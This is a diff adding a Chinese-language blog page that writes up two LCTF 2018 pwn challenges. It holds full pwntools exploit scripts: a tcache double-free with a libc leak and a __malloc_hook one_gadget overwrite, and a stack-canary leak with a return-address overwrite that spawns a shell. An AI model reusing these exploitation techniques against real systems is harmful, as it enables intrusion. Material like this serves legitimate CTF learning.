@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="0x01 easy heapoff by one: 123456789101112if ( a2 )&amp;#123;  while ( 1 )  &amp;#123;    read(0, &amp;a1[v3], 1uLL);    if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] &#x3D;&#x3D; &#39;\n&#39; )">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LCTF2018 easy_heap&amp;&amp;just_pwn">
+<meta property="og:url" content="http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="0x01 easy heapoff by one: 123456789101112if ( a2 )&amp;#123;  while ( 1 )  &amp;#123;    read(0, &amp;a1[v3], 1uLL);    if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] &#x3D;&#x3D; &#39;\n&#39; )">
+<meta property="article:published_time" content="2018-11-19T15:03:41.000Z">
+<meta property="article:modified_time" content="2018-11-22T15:06:30.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>LCTF2018 easy_heap&amp;&amp;just_pwn</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/11/27/NCTF2018/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/11/10/2018-XCTF-Finals/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&text=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&is_video=false&description=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LCTF2018 easy_heap&amp;&amp;just_pwn&body=Check out this article: http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&name=LCTF2018 easy_heap&amp;&amp;just_pwn&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-easy-heap"><span class="toc-number">1.</span> <span class="toc-text">0x01 easy heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-just-pwn"><span class="toc-number">2.</span> <span class="toc-text">0x02 just pwn</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        LCTF2018 easy_heap&amp;&amp;just_pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-19T15:03:41.000Z" itemprop="datePublished">2018-11-19</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-easy-heap"><a href="#0x01-easy-heap" class="headerlink" title="0x01 easy heap"></a>0x01 easy heap</h3><p>off by one:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ( a2 )</span><br><span class="line">&#123;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">    if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] &#x3D;&#x3D; &#39;\n&#39; )</span><br><span class="line">      break;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[v3] &#x3D; 0;</span><br><span class="line">  a1[a2] &#x3D; 0;  &#x2F;&#x2F;off by one</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>libc2.27-&gt;tcache<br>只能malloc(0xF8)<br>可以先填满对应的tcache bin获得unsorted bin<br>审错了他的read过程，看成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] &#x3D;&#x3D; &#39;\n&#39; )</span><br><span class="line">  ++v3;</span><br><span class="line">  break;</span><br></pre></td></tr></table></figure>
+<p>以为会连续生成两个”\x00”，没法bypass，(fd和bk只有末位是”\x00”),卡了好久<br>晚上回来重新看发现看错了orz<br>剩下就是利用off by one覆盖prev in use，使两个堆块发生合并，然后便可以有两个索引指向同一个chunk<br>而后进行tcache的double free，使chunk分配到malloc hook,写入one_gadget,再malloc一次即可getshell<br><strong>EXP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def new(size,note):</span><br><span class="line">  p.recvuntil(&quot;?\n&gt; &quot;)</span><br><span class="line">  p.sendline(&quot;1&quot;)</span><br><span class="line">  p.recvuntil(&quot;size \n&gt; &quot;)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(&quot;content \n&gt; &quot;)</span><br><span class="line">  if size&#x3D;&#x3D;0:</span><br><span class="line">    return</span><br><span class="line">  else:</span><br><span class="line">     p.send(note)</span><br><span class="line">def delete(index):</span><br><span class="line">  p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">  p.sendline(&quot;2&quot;)</span><br><span class="line">  p.recvuntil(&quot;index \n&gt; &quot;)</span><br><span class="line">  p.sendline(str(index))</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p&#x3D;remote(&quot;118.25.150.134&quot;,6666)</span><br><span class="line">#p&#x3D;process(&quot;.&#x2F;easy_heap&quot;)</span><br><span class="line">for i in range(10):</span><br><span class="line">   new(0,&quot;kirin\n&quot;)</span><br><span class="line">#make unsorted bin</span><br><span class="line">for i in range(5):</span><br><span class="line">  delete(9-i)#9 8 7 6 5</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(0)</span><br><span class="line">delete(4)</span><br><span class="line">for i in range(7):</span><br><span class="line">    new(0,&quot;kirin\n&quot;)</span><br><span class="line">new(0,&quot;kirin\n&quot;)</span><br><span class="line">new(0xf8,&quot;\x00&quot;)</span><br><span class="line">new(0,&quot;kirin\n&quot;)</span><br><span class="line">for i in range(6):</span><br><span class="line">  delete(i+1)</span><br><span class="line">delete(9)</span><br><span class="line">delete(0)</span><br><span class="line">#leak</span><br><span class="line">p.recvuntil(&quot;?\n&gt; &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;index \n&gt; &quot;)</span><br><span class="line">p.sendline(&quot;8&quot;)</span><br><span class="line">s&#x3D;p.recv(6)</span><br><span class="line">libc_addr&#x3D;u64(s.ljust(8,&quot;\x00&quot;))-0x3ebca0</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">for i in range(8):</span><br><span class="line">  new(0,&quot;kirin\n&quot;)</span><br><span class="line">delete(8)</span><br><span class="line">delete(9)</span><br><span class="line">new(0x10,p64(libc_addr+0x3ebc30))</span><br><span class="line">new(0x10,&quot;kirin\n&quot;)</span><br><span class="line">for i in range(8):</span><br><span class="line">   delete(i)</span><br><span class="line">for i in range(8):</span><br><span class="line">   new(0x10,p64(libc_addr+0x10a38c))</span><br><span class="line">delete(0)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-just-pwn"><a href="#0x02-just-pwn" class="headerlink" title="0x02 just pwn"></a>0x02 just pwn</h3><p>这题比较难受，第二天早上审了一会就写好exp<br>结果感觉栈溢出的地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, &amp;buf, 0x200uLL);</span><br></pre></td></tr></table></figure>
+<p>只能读到回车返回(只能sendline不能send，实际上可以send)<br>就没去试最开始写好的exp，其实最开始就能打到shell<br>程序：<br>最开始一段加密，利用time(0)作为key加密用户数据<br>在开始的地方伪造money，最多为9999，因此栈溢出地方可以调用两次<br>最开始想法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一次leak canary，一次覆盖返回地址低字节get shell</span><br><span class="line">因为程序存在后门system(&quot;&#x2F;bin&#x2F;sh&quot;)，所以原返回地址与后门地址高字节相同</span><br><span class="line">leak canary可以考虑使用栈溢出前的递归函数将canary布置到栈空间中</span><br><span class="line">函数返回时canary在原位置，进入栈溢出那个函数的时候便可以覆盖掉canary低字节来puts出canary</span><br><span class="line">只要爆一下4bits即可(倒数第四位)</span><br></pre></td></tr></table></figure>
+<p>其实应该是预期解，我突然以为只能sendline来使read结束，这样会多覆盖一个回车符造成get shell失败，实际上直接send也可以，最开始写的send，不过因为湖湘杯，没去试一试，晚上也就想当然得改了orz<br><strong>另外最开始的对用户数据的加密，因为是time(0)，我没去管加密过程，直接patch掉程序，改对应money位置为9999，在运行原程序的同时运行patch后的程序，便可以得到money为9999的secret code</strong></p>
+<p><strong>EXP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;just_pwn&quot;)</span><br><span class="line">p.recvuntil(&quot;3.Exit\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;code:\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">s&#x3D;raw_input(&quot;:&quot;)#input the secret code with money:9999</span><br><span class="line">p.recvuntil(&quot;3.Exit\n&quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(s)</span><br><span class="line">p.recvuntil(&quot;4.hit on the head of the developer\n------------------------\n&quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">for i in range(4):</span><br><span class="line">   p.recvuntil(&quot;m\n&quot;)</span><br><span class="line">   p.sendline(&quot;n&quot;)</span><br><span class="line">p.recvuntil(&quot;m\n&quot;)</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line"></span><br><span class="line">#leak canary</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*8)</span><br><span class="line">p.recvuntil(&quot;aaaaaaaa\n&quot;)</span><br><span class="line">canary&#x3D;&quot;\x00&quot;+p.recv(7)</span><br><span class="line">print hex(u64(canary))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">p.recvuntil(&quot;4.hit on the head of the developer\n------------------------\n&quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;m\n&quot;)</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.send(&quot;a&quot;*8*25+canary+&quot;a&quot;*8+p16(0x122c))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-easy-heap"><span class="toc-number">1.</span> <span class="toc-text">0x01 easy heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-just-pwn"><span class="toc-number">2.</span> <span class="toc-text">0x02 just pwn</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&text=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&is_video=false&description=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LCTF2018 easy_heap&amp;&amp;just_pwn&body=Check out this article: http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&title=LCTF2018 easy_heap&amp;&amp;just_pwn" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/19/LCTF2018-easy-heap-just-pwn/&name=LCTF2018 easy_heap&amp;&amp;just_pwn&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
